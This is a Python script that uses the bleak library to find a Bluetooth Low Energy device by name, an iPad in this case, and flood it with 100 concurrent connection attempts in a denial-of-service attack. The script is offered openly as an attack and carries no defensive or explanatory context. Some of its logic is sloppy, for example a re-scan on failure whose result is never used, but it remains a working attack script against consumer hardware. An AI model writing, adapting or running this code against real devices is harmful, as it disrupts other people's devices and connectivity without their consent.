import asyncio
from bleak import BleakScanner, BleakClient
import logging

class DOSAttack:
    def __init__(self):
        return
    
    async def connect_to_device(self, name: str):
        device = await BleakScanner.find_device_by_name(name)
        if device is not None:
            logging.info(device)
            logging.info(f"{device.address=}")
            return device.address
        else:
            logging.warning("device not found")
            return None
    
    async def dos_attack(self, name, device_address):
        print("attack")
        try: 
            logging.info("trying")
            async with BleakClient(device_address) as client:
                print(f"Connected to {device_address}")
                print(f"Disconnected") 
                await asyncio.sleep(0.1)
        except Exception as e:
            print(f"Failed to connect: {e}")
            device_address = await self.connect_to_device(name)
    
    async def concurrent_attacks(self, name, device_address, num_attacks):
        tasks = []
        i = 0
        while len(tasks) < num_attacks:
            i = i + 1
            logging.info(f"Creating task {i}")
            task = asyncio.create_task(self.dos_attack(name, device_address))
            tasks.append(task)
        logging.info("Running tasks")
        await asyncio.gather(*tasks)

async def main():
    logging.basicConfig(level=logging.INFO)
    dos_attack = DOSAttack()
    ipad_address = await dos_attack.connect_to_device("iPad (8)")
    await dos_attack.concurrent_attacks("iPad(8)", ipad_address, 100)

asyncio.run(main())